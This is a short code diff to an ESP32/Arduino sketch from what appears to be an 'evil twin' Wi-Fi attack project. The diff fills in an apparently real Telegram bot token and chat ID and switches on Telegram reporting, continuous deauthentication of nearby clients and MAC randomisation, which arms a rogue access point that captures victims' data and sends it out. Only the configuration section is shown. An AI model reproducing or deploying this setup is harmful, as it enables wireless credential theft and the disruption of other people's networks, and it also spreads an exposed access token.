@@ -1,4 +1,4 @@
-https://github.com/tahergaming13/evil-twin-atack-.git#include <Arduino.h>
+#include <Arduino.h>
 #include <WiFi.h>
 #include <WebServer.h>
 #include <DNSServer.h>
@@ -8,17 +8,17 @@ https://github.com/tahergaming13/evil-twin-atack-.git#include <Arduino.h>
 
 // ==================== CONFIGURATION ====================
 // Telegram settings
-const String TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
-const String TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
-const bool ENABLE_TELEGRAM = false;
+const String TELEGRAM_BOT_TOKEN = "8663145419:AAESffhsPb8rJgMXXyR_HLDwlPfKsoDA16w";
+const String TELEGRAM_CHAT_ID = "6705271882";
+const bool ENABLE_TELEGRAM = true ;
 
 // Deauth settings
-bool deauthActive = false;
+bool deauthActive = true;
 unsigned long lastDeauthTime = 0;
 const unsigned long DEAUTH_INTERVAL = 100;
 
 // MAC randomization
-bool macRandomized = false;
+bool macRandomized = true ;
 
 // Client fingerprinting
 struct ConnectedClient {
